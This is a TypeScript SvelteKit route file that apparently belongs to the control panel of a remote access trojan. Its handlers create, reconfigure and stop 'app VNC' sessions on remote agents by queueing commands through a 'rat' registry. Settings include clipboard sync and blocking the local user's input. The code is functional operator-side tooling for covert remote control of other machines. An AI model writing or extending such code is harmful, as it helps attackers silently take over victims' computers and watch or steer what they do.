import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import { appVncManager, AppVncError, resolveAppVncStartContext } from '$lib/server/rat/app-vnc';
import type {
	AppVncCommandPayload,
	AppVncSessionResponse,
	AppVncSessionSettings,
	AppVncSessionSettingsPatch
} from '$lib/types/app-vnc';

function normalizeHeartbeat(value: unknown): number | undefined {
	if (typeof value === 'number') {
		return Number.isFinite(value) ? value : undefined;
	}
	if (typeof value === 'string' && value.trim() !== '') {
		const parsed = Number.parseFloat(value);
		return Number.isFinite(parsed) ? parsed : undefined;
	}
	return undefined;
}

function normalizeSettings(input: Record<string, unknown>): AppVncSessionSettingsPatch {
	const settings: AppVncSessionSettingsPatch = {};
	if (typeof input.monitor === 'string') {
		settings.monitor = input.monitor;
	}
	if (typeof input.quality === 'string') {
		settings.quality = input.quality as AppVncSessionSettings['quality'];
	}
	if (typeof input.captureCursor === 'boolean') {
		settings.captureCursor = input.captureCursor;
	}
	if (typeof input.clipboardSync === 'boolean') {
		settings.clipboardSync = input.clipboardSync;
	}
	if (typeof input.blockLocalInput === 'boolean') {
		settings.blockLocalInput = input.blockLocalInput;
	}
	const heartbeat = normalizeHeartbeat(input.heartbeatInterval);
	if (heartbeat !== undefined) {
		settings.heartbeatInterval = heartbeat;
	}
	if (typeof input.appId === 'string') {
		settings.appId = input.appId;
	}
	if (typeof input.windowTitle === 'string') {
		settings.windowTitle = input.windowTitle;
	}
	return settings;
}

export const GET: RequestHandler = ({ params }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const session = appVncManager.getSessionState(id);
	return json({ session } satisfies AppVncSessionResponse);
};

export const POST: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let body: Record<string, unknown> = {};
	try {
		body = (await request.json()) as Record<string, unknown>;
	} catch {
		body = {};
	}

	try {
		const settings = normalizeSettings(body);
		const session = appVncManager.createSession(id, settings);

		try {
			const { application, virtualization } = resolveAppVncStartContext(id, session.settings);
			const payload: AppVncCommandPayload = {
				action: 'start',
				sessionId: session.sessionId,
				settings: session.settings,
				application,
				virtualization
			};
			registry.queueCommand(id, { name: 'app-vnc', payload });
		} catch (err) {
			appVncManager.closeSession(id);
			if (err instanceof RegistryError) {
				throw error(err.status, err.message);
			}
			throw error(500, 'Failed to queue app VNC command');
		}

		return json({ session } satisfies AppVncSessionResponse, { status: 201 });
	} catch (err) {
		if (err instanceof AppVncError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to create app VNC session');
	}
};

export const PATCH: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let body: Record<string, unknown>;
	try {
		body = (await request.json()) as Record<string, unknown>;
	} catch {
		throw error(400, 'Invalid session payload');
	}

	const updates = normalizeSettings(body);
	const session = appVncManager.getSession(id);
	if (!session || !session.active) {
		throw error(404, 'No active app VNC session');
	}

	if (typeof body.sessionId === 'string' && body.sessionId !== session.id) {
		throw error(409, 'Session identifier mismatch');
	}

	try {
		appVncManager.updateSettings(id, updates);
	} catch (err) {
		if (err instanceof AppVncError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to update app VNC settings');
	}

	if (Object.keys(updates).length > 0) {
		const payload: AppVncCommandPayload = {
			action: 'configure',
			sessionId: session.id,
			settings: updates
		};
		try {
			registry.queueCommand(id, { name: 'app-vnc', payload });
		} catch (err) {
			if (err instanceof RegistryError) {
				throw error(err.status, err.message);
			}
			throw error(500, 'Failed to queue configuration command');
		}
	}

	const next = appVncManager.getSessionState(id);
	return json({ session: next } satisfies AppVncSessionResponse);
};

export const DELETE: RequestHandler = async ({ params, request }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	let body: Record<string, unknown> = {};
	try {
		body = (await request.json()) as Record<string, unknown>;
	} catch {
		body = {};
	}

	const session = appVncManager.getSession(id);
	if (!session || !session.active) {
		const state = appVncManager.getSessionState(id);
		return json({ session: state } satisfies AppVncSessionResponse);
	}

	if (typeof body.sessionId === 'string' && body.sessionId !== session.id) {
		throw error(409, 'Session identifier mismatch');
	}

	const payload: AppVncCommandPayload = {
		action: 'stop',
		sessionId: session.id
	};

	try {
		registry.queueCommand(id, { name: 'app-vnc', payload });
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue stop command');
	}

	appVncManager.closeSession(id);
	const state = appVncManager.getSessionState(id);
	return json({ session: state } satisfies AppVncSessionResponse);
};
